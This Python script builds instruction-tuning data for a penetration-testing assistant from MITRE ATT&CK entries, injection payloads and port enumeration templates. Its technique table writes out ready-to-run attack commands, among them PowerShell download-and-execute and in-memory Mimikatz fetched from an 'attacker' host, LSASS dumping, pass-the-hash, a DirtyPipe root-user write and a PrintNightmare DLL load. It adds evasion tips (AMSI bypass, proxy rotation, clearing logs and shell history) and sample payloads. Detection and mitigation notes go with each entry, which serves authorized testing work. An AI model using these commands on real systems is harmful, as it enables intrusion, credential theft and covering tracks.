#!/usr/bin/env python3
"""
Comprehensive Pentest Technique Generator
Creates detailed samples covering specific techniques from various frameworks
"""

import json
import random
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent.parent / "data" / "generated"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ============================================
# MITRE ATT&CK TECHNIQUE SAMPLES
# ============================================

TECHNIQUES = {
    "T1110.001": {
        "name": "Brute Force: Password Guessing",
        "tactic": "Credential Access",
        "description": "Attempt to guess passwords without knowledge of actual passwords",
        "samples": [
            {
                "scenario": "SSH brute force against single target",
                "target": "10.0.0.5:22 (SSH)",
                "tool": "hydra",
                "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5",
                "opsec": "- Rate limit to avoid account lockouts\n- Use proxychains for IP rotation\n- Monitor for defensive response",
                "detection": "Multiple failed SSH auth attempts, same user different passwords",
                "mitigation": "Implement account lockout policies, MFA, fail2ban"
            },
            {
                "scenario": "RDP brute force on Windows target",
                "target": "10.0.0.10:3389 (RDP)",
                "tool": "crowbar",
                "command": "crowbar -b rdp -s 10.0.0.10/32 -u administrator -C passwords.txt",
                "opsec": "- Windows logs failed logins (Event ID 4625)\n- Space attempts over time\n- Consider NLA bypass techniques",
                "detection": "Event ID 4625 with LogonType 10 (RemoteInteractive)",
                "mitigation": "NLA, MFA, RDP gateway, account lockout"
            }
        ]
    },
    "T1110.003": {
        "name": "Brute Force: Password Spraying",
        "tactic": "Credential Access",
        "description": "Use one password against many accounts to avoid lockout",
        "samples": [
            {
                "scenario": "O365 password spray",
                "target": "Office 365 tenant",
                "tool": "MSOLSpray",
                "command": "python3 MSOLSpray.py -u users.txt -p 'Summer2023!' -t 10",
                "opsec": "- Wait 30+ minutes between password attempts\n- Use residential proxies\n- Validate users first with O365creeper",
                "detection": "Multiple accounts failing with same password, unified audit logs",
                "mitigation": "Smart lockout, Azure AD Identity Protection, conditional access"
            },
            {
                "scenario": "Domain password spray",
                "target": "corp.local domain",
                "tool": "Spray",
                "command": "spray.sh -smb 10.0.0.1 users.txt passwords.txt 1 30 corp.local",
                "opsec": "- Enumerate lockout policy first\n- Stay under lockout threshold\n- Target accounts without MFA",
                "detection": "Event ID 4771 with error 0x18 across multiple accounts",
                "mitigation": "Fine-grained password policies, MFA for all accounts"
            }
        ]
    },
    "T1059.001": {
        "name": "Command and Scripting: PowerShell",
        "tactic": "Execution",
        "description": "Use PowerShell to execute commands and scripts",
        "samples": [
            {
                "scenario": "Download and execute payload",
                "target": "Windows workstation",
                "tool": "PowerShell",
                "command": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')\"",
                "opsec": "- Use HTTPS to avoid content inspection\n- AMSI bypass: [Ref].Assembly.GetType('...')\n- Consider encoded commands",
                "detection": "Event ID 4104, ScriptBlock logging, AMSI alerts",
                "mitigation": "Constrained Language Mode, AMSI, application whitelisting"
            },
            {
                "scenario": "In-memory Mimikatz",
                "target": "Compromised Windows server",
                "tool": "Invoke-Mimikatz",
                "command": "powershell -ep bypass -c \"IEX(IWR 'https://attacker/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
                "opsec": "- Patch AMSI before loading\n- Use obfuscated version (Invoke-Obfuscation)\n- Consider .NET assembly loading",
                "detection": "Suspicious PowerShell keywords, memory patterns",
                "mitigation": "Credential Guard, LSASS protection, monitored WDigest"
            }
        ]
    },
    "T1003.001": {
        "name": "OS Credential Dumping: LSASS Memory",
        "tactic": "Credential Access",
        "description": "Extract credentials from LSASS process memory",
        "samples": [
            {
                "scenario": "Mimikatz sekurlsa",
                "target": "Windows domain workstation",
                "tool": "Mimikatz",
                "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
                "opsec": "- Requires admin/SYSTEM\n- EDR will likely detect\n- Consider memory dump + offline extraction",
                "detection": "Sysmon Event ID 10 (process access to lsass), Defender alerts",
                "mitigation": "Credential Guard, Protected Users group, RunAsPPL"
            },
            {
                "scenario": "Procdump LSASS",
                "target": "Endpoint with EDR",
                "tool": "procdump",
                "command": "procdump.exe -ma lsass.exe lsass.dmp",
                "opsec": "- Signed Microsoft binary (LOLBin)\n- Move dump offline for extraction\n- Delete dump after extraction",
                "detection": "Access to lsass.exe, suspicious file creation",
                "mitigation": "Application control, protected process light"
            }
        ]
    },
    "T1078.002": {
        "name": "Valid Accounts: Domain Accounts",
        "tactic": "Persistence",
        "description": "Use compromised domain credentials for access",
        "samples": [
            {
                "scenario": "Pass the Hash",
                "target": "Windows server with extracted NTLM hash",
                "tool": "Impacket psexec",
                "command": "psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@10.0.0.5",
                "opsec": "- Creates service on target\n- Event ID 7045 (service install)\n- Consider wmiexec for stealth",
                "detection": "Event ID 4624 type 3, service creation, network logon",
                "mitigation": "Credential Guard, SMB signing, limit admin rights"
            },
            {
                "scenario": "Over-pass the Hash",
                "target": "Kerberos environment",
                "tool": "Rubeus",
                "command": "Rubeus.exe asktgt /user:admin /rc4:8846f7... /ptt",
                "opsec": "- Injects Kerberos ticket into session\n- More stealthy than NTLM\n- Refresh tickets as needed",
                "detection": "Event ID 4768 with RC4 encryption (downgrade)",
                "mitigation": "Enforce AES, monitor for RC4 TGT requests"
            }
        ]
    },
    "T1021.002": {
        "name": "Remote Services: SMB/Windows Admin Shares",
        "tactic": "Lateral Movement",
        "description": "Use SMB for lateral movement to remote systems",
        "samples": [
            {
                "scenario": "PsExec lateral movement",
                "target": "Windows server 10.0.0.20",
                "tool": "PsExec",
                "command": "psexec \\\\10.0.0.20 -u domain\\admin -p password cmd",
                "opsec": "- Leaves service binary on target\n- High IOC in logs\n- Consider alternative execution methods",
                "detection": "Event ID 7045, PSEXESVC service, network share access",
                "mitigation": "Disable admin shares, firewall SMB, monitor service creation"
            },
            {
                "scenario": "WMI lateral movement",
                "target": "Windows endpoint",
                "tool": "wmiexec",
                "command": "wmiexec.py domain/admin:password@10.0.0.20 'whoami'",
                "opsec": "- No file writes (more stealthy)\n- Uses WMI for execution\n- Output returned via SMB",
                "detection": "Event ID 4648, WMI process creation (Event ID 1)",
                "mitigation": "Disable remote WMI, monitor WmiPrvSE child processes"
            }
        ]
    },
    "T1068": {
        "name": "Exploitation for Privilege Escalation",
        "tactic": "Privilege Escalation",
        "description": "Exploit software vulnerabilities to gain elevated privileges",
        "samples": [
            {
                "scenario": "Linux kernel exploit",
                "target": "Ubuntu 18.04 with vulnerable kernel",
                "tool": "DirtyPipe (CVE-2022-0847)",
                "command": "./dirtypipe /etc/passwd 1 \"attacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash\\n\"",
                "opsec": "- May crash system if unsuccessful\n- Test on equivalent system first\n- Have backup access method",
                "detection": "Unusual writes to read-only files, kernel logs",
                "mitigation": "Patch kernel, container security, mandatory access control"
            },
            {
                "scenario": "Windows Print Spooler (PrintNightmare)",
                "target": "Windows Server with spooler enabled",
                "tool": "CVE-2021-34527 exploit",
                "command": "python3 printnightmare.py domain/user:pass@10.0.0.5 '\\\\attacker\\share\\evil.dll'",
                "opsec": "- Requires SMB share accessible from target\n- Noisy - creates DLL on target\n- Spooler often enabled unnecessarily",
                "detection": "Unusual spoolsv.exe activity, DLL load events",
                "mitigation": "Disable Print Spooler, patch, Point and Print restrictions"
            }
        ]
    },
    "T1486": {
        "name": "Data Encrypted for Impact",
        "tactic": "Impact",
        "description": "Encrypt data on target systems (ransomware impact simulation)",
        "samples": [
            {
                "scenario": "Ransomware simulation - file encryption test",
                "target": "Test network share with sample data",
                "tool": "Custom script (controlled)",
                "command": "# AUTHORIZED TESTING ONLY\npython3 encrypt_test.py --directory /test/data --key test123 --rename .encrypted",
                "opsec": "- ONLY use in authorized simulations\n- Keep decryption key secure\n- Document all encrypted files",
                "detection": "Mass file modifications, unusual file extensions",
                "mitigation": "Backup strategy, behavioral detection, network segmentation"
            }
        ]
    },
    "T1070.004": {
        "name": "Indicator Removal: File Deletion",
        "tactic": "Defense Evasion",
        "description": "Delete files left behind after exploitation",
        "samples": [
            {
                "scenario": "Clean up exploitation artifacts",
                "target": "Compromised Windows server",
                "tool": "SDelete",
                "command": "sdelete -p 3 C:\\Temp\\payload.exe",
                "opsec": "- Use secure delete to prevent recovery\n- Check for backup copies\n- Clear relevant event logs",
                "detection": "MFT analysis, volume shadow copies, forensic recovery",
                "mitigation": "Forensic imaging, shadow copy protection, file integrity monitoring"
            },
            {
                "scenario": "Linux artifact cleanup",
                "target": "Compromised Linux server",
                "tool": "shred",
                "command": "shred -u -z -n 3 /tmp/implant && history -c && > ~/.bash_history",
                "opsec": "- Overwrite file before deletion\n- Clear shell history\n- Check for command logging (auditd)",
                "detection": "Auditd logs, file access timestamps, command history gaps",
                "mitigation": "Centralized logging, immutable logs, file integrity monitoring"
            }
        ]
    },
    "T1046": {
        "name": "Network Service Discovery",
        "tactic": "Discovery",
        "description": "Scan for services running on remote systems",
        "samples": [
            {
                "scenario": "Service version detection",
                "target": "Internal network 10.0.0.0/24",
                "tool": "nmap",
                "command": "nmap -sV -sC --top-ports 1000 -oA scan_results 10.0.0.0/24",
                "opsec": "- Avoid -T5 (too aggressive)\n- Split scans over time\n- Use -sS for stealth if possible",
                "detection": "IDS signatures, connection logs, firewall alerts",
                "mitigation": "Network segmentation, IDS/IPS, baseline traffic analysis"
            },
            {
                "scenario": "Living off the land discovery",
                "target": "Windows domain",
                "tool": "Native commands",
                "command": "for /L %i in (1,1,254) do @ping -n 1 -w 100 10.0.0.%i > nul && echo 10.0.0.%i is up",
                "opsec": "- Uses native tools (no additional binaries)\n- Slower but stealthier\n- Combine with net commands",
                "detection": "Unusual volume of ICMP, net command execution",
                "mitigation": "Baseline normal behavior, monitor for discovery patterns"
            }
        ]
    }
}


def generate_technique_samples():
    """Generate samples from MITRE ATT&CK techniques"""
    samples = []
    
    for technique_id, data in TECHNIQUES.items():
        for scenario_data in data["samples"]:
            output = f"""MITRE ATT&CK Analysis: {technique_id} - {data["name"]}

[TACTIC]
{data["tactic"]}

[DESCRIPTION]
{data["description"]}

[SCENARIO]
{scenario_data["scenario"]}

[TARGET]
{scenario_data["target"]}

[TOOL/TECHNIQUE]
{scenario_data["tool"]}

[COMMAND]
```
{scenario_data["command"]}
```

[OPERATIONAL SECURITY]
{scenario_data["opsec"]}

[DETECTION INDICATORS]
{scenario_data["detection"]}

[RECOMMENDED MITIGATIONS]
{scenario_data["mitigation"]}

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response"""
            
            samples.append({
                "instruction": f"Explain how to execute {data['name']} ({technique_id}) during a penetration test.",
                "input": f"Scenario: {scenario_data['scenario']}\nTarget: {scenario_data['target']}",
                "output": output.strip()
            })
    
    return samples


# ============================================
# VULNERABILITY CLASSES
# ============================================

VULN_CLASSES = [
    {
        "class": "Injection",
        "variants": [
            {"type": "SQL Injection", "payload": "' OR '1'='1", "vector": "User input in SQL query"},
            {"type": "Command Injection", "payload": "; id; ls", "vector": "User input in system command"},
            {"type": "LDAP Injection", "payload": "*)(uid=*))(|(uid=*", "vector": "User input in LDAP query"},
            {"type": "XPath Injection", "payload": "' or '1'='1", "vector": "User input in XPath query"},
            {"type": "NoSQL Injection", "payload": '{"$gt": ""}', "vector": "User input in NoSQL query"},
            {"type": "Template Injection", "payload": "{{7*7}}", "vector": "User input in template"},
        ]
    },
    {
        "class": "Authentication",
        "variants": [
            {"type": "Broken Auth", "payload": "N/A", "vector": "Session management flaws"},
            {"type": "Credential Stuffing", "payload": "breached credentials", "vector": "Leaked password databases"},
            {"type": "JWT Vulnerabilities", "payload": "alg: none", "vector": "Weak JWT validation"},
            {"type": "OAuth Flaws", "payload": "redirect_uri manipulation", "vector": "OAuth implementation"},
            {"type": "Session Fixation", "payload": "pre-set session ID", "vector": "Session handling"},
        ]
    },
    {
        "class": "Information Disclosure",
        "variants": [
            {"type": "Error Messages", "payload": "trigger error", "vector": "Verbose error handling"},
            {"type": "Directory Listing", "payload": "browse directories", "vector": "Misconfigured web server"},
            {"type": "Source Code Exposure", "payload": ".git/.svn access", "vector": "Version control exposure"},
            {"type": "Backup Files", "payload": ".bak, .old, ~", "vector": "Backup file extensions"},
            {"type": "Debug Endpoints", "payload": "/debug, /phpinfo", "vector": "Debug features enabled"},
        ]
    },
    {
        "class": "Access Control",
        "variants": [
            {"type": "IDOR", "payload": "modify ID parameter", "vector": "Direct object references"},
            {"type": "Privilege Escalation", "payload": "modify role parameter", "vector": "Role-based access"},
            {"type": "Path Traversal", "payload": "../../../etc/passwd", "vector": "File path parameters"},
            {"type": "Forced Browsing", "payload": "/admin direct access", "vector": "URL guessing"},
            {"type": "HTTP Method Override", "payload": "X-HTTP-Method-Override: PUT", "vector": "Method restrictions"},
        ]
    }
]


def generate_vuln_class_samples():
    """Generate vulnerability class samples"""
    samples = []
    
    for vuln_class in VULN_CLASSES:
        for variant in vuln_class["variants"]:
            output = f"""Vulnerability Analysis: {variant["type"]}

[VULNERABILITY CLASS]
{vuln_class["class"]}

[ATTACK VECTOR]
{variant["vector"]}

[SAMPLE PAYLOAD]
{variant["payload"]}

[TESTING METHODOLOGY]
1. Identify input vectors for this vulnerability class
2. Test with benign payload first to confirm processing
3. Gradually escalate payload complexity
4. Confirm exploitability and document impact

[EXPLOITATION STEPS]
- Identify injection point or vulnerable functionality
- Test with signature payload: {variant["payload"]}
- Escalate to achieve desired impact
- Document proof of concept for report

[RISK ASSESSMENT]
Severity depends on:
- Data accessible through exploitation
- System privileges obtainable
- Impact on confidentiality, integrity, availability

[REMEDIATION]
- Input validation and sanitization
- Parameterized queries (for injection)
- Proper access control implementation
- Security-aware design patterns"""
            
            samples.append({
                "instruction": f"How do I test for and exploit {variant['type']} vulnerabilities?",
                "input": f"Web application testing, looking for {vuln_class['class']} vulnerabilities.",
                "output": output.strip()
            })
    
    return samples


# ============================================
# PORT/SERVICE SPECIFIC GUIDANCE
# ============================================

SERVICES = {
    21: {"name": "FTP", "tests": ["anonymous login", "version check", "brute force", "passive/active mode"]},
    22: {"name": "SSH", "tests": ["version detection", "auth methods", "brute force", "key enumeration"]},
    23: {"name": "Telnet", "tests": ["banner grab", "brute force", "clear text sniffing"]},
    25: {"name": "SMTP", "tests": ["VRFY/EXPN enum", "relay testing", "auth brute force"]},
    53: {"name": "DNS", "tests": ["zone transfer", "subdomain enum", "cache poisoning"]},
    80: {"name": "HTTP", "tests": ["directory brute", "vuln scan", "header analysis", "method testing"]},
    110: {"name": "POP3", "tests": ["version check", "brute force", "clear text capture"]},
    111: {"name": "RPC", "tests": ["rpcinfo dump", "NFS shares", "service enumeration"]},
    135: {"name": "MSRPC", "tests": ["interface enumeration", "exploit modules"]},
    139: {"name": "NetBIOS", "tests": ["name table dump", "share enumeration", "null session"]},
    143: {"name": "IMAP", "tests": ["version check", "brute force", "mailbox enum"]},
    443: {"name": "HTTPS", "tests": ["SSL/TLS analysis", "cert check", "all HTTP tests"]},
    445: {"name": "SMB", "tests": ["version detect", "share enum", "null session", "brute force"]},
    1433: {"name": "MSSQL", "tests": ["version check", "brute force", "xp_cmdshell"]},
    1521: {"name": "Oracle", "tests": ["SID brute", "TNS listener", "brute force"]},
    3306: {"name": "MySQL", "tests": ["version check", "brute force", "UDF injection"]},
    3389: {"name": "RDP", "tests": ["version check", "NLA status", "brute force", "BlueKeep"]},
    5432: {"name": "PostgreSQL", "tests": ["version check", "brute force", "config extraction"]},
    5900: {"name": "VNC", "tests": ["auth bypass", "brute force", "screenshot capture"]},
    6379: {"name": "Redis", "tests": ["no auth check", "config dump", "RCE via modules"]},
    8080: {"name": "HTTP Proxy", "tests": ["proxy abuse", "header injection", "method testing"]},
    27017: {"name": "MongoDB", "tests": ["no auth check", "database enum", "injection"]},
}


def generate_service_samples():
    """Generate service-specific testing samples"""
    samples = []
    
    for port, data in SERVICES.items():
        tests_list = "\n".join(f"- {test}" for test in data["tests"])
        
        output = f"""Service Analysis: {data["name"]} (Port {port})

[SERVICE OVERVIEW]
Port: {port}/tcp
Service: {data["name"]}
Common Use: {"Secure remote access" if port == 22 else "Web server" if port in [80,443] else "Database" if port in [1433,3306,5432,1521,27017] else "File sharing" if port in [21,139,445] else "Various network services"}

[TESTING METHODOLOGY]
{tests_list}

[ENUMERATION COMMANDS]
```
# Basic service detection
nmap -sV -p {port} TARGET

# Detailed enumeration
nmap -sV -sC -p {port} --script={data["name"].lower()}* TARGET

# Version-specific checks
searchsploit {data["name"].lower()}
```

[COMMON VULNERABILITIES]
- Default/weak credentials
- Outdated versions with known CVEs
- Misconfigurations allowing unauthorized access
- Information disclosure through banners/errors

[EXPLOITATION POTENTIAL]
{data["name"]} services can potentially lead to:
- Credential access (brute force, default creds)
- Data exfiltration (if storing sensitive data)
- Code execution (via service-specific vulnerabilities)
- Lateral movement (credential reuse)

[DOCUMENTATION]
Record all findings including:
- Service version
- Authentication status
- Accessible data
- Potential impact"""
        
        samples.append({
            "instruction": f"How do I enumerate and test {data['name']} service during a pentest?",
            "input": f"Found port {port} open on target. Need to enumerate and test {data['name']}.",
            "output": output.strip()
        })
    
    return samples


def main():
    """Generate all technique samples"""
    print("🔧 Generating technique-based samples...")
    
    all_samples = []
    
    generators = [
        ("mitre_techniques", generate_technique_samples),
        ("vulnerability_classes", generate_vuln_class_samples),
        ("service_enumeration", generate_service_samples),
    ]
    
    for name, generator in generators:
        print(f"  Generating {name} samples...")
        samples = generator()
        all_samples.extend(samples)
        
        # Save category file
        category_file = OUTPUT_DIR / f"{name}.jsonl"
        with open(category_file, 'w') as f:
            for sample in samples:
                f.write(json.dumps(sample) + '\n')
        print(f"    ✓ {len(samples)} samples saved to {category_file.name}")
    
    # Save combined
    combined_file = OUTPUT_DIR / "techniques_combined.jsonl"
    with open(combined_file, 'w') as f:
        for sample in all_samples:
            f.write(json.dumps(sample) + '\n')
    
    print(f"\n✅ Total: {len(all_samples)} technique samples generated")
    return len(all_samples)


if __name__ == "__main__":
    main()
